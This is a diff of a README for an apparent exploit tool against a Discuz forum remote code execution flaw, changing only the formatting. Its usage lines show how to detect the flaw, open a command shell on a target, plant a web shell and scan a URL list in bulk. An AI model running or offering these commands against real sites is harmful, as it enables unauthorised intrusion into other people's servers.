@@ -30,28 +30,29 @@ pip -r requirements.txt
 ----------------
 **Help**
 
-python discuz_mlRce.py -h<br/>
+python discuz_mlRce.py -h
 
 
 
 ----------------
 **Vulnerability Detection** 
 
-python discuz_mlRce.py -u "http://www.ppp.cn/forum.php" <br/>
+python discuz_mlRce.py -u "http://www.ppp.cn/forum.php" 
 
 ------
 **GETTING Command Shell**
-<br/>
-python discuz_mlRce.py -u "http://www.ppp.cn/forum.php" --cmdshell<br/>
+
+python discuz_mlRce.py -u "http://www.ppp.cn/forum.php" --cmdshell
 ----------------
 
 **GETTING Shell URL**
-<br/>
-python ddiscuz_mlRce.py -u "http://www.ppp.cn/forum.php" --getshell<br/>
+
+
+python ddiscuz_mlRce.py -u "http://www.ppp.cn/forum.php" --getshell
 ----------------
 
 **Scanning List of URL** 
-<br/>
+
 python discuz_mlRce.py -f urls.txt<br/>
 
 ----------
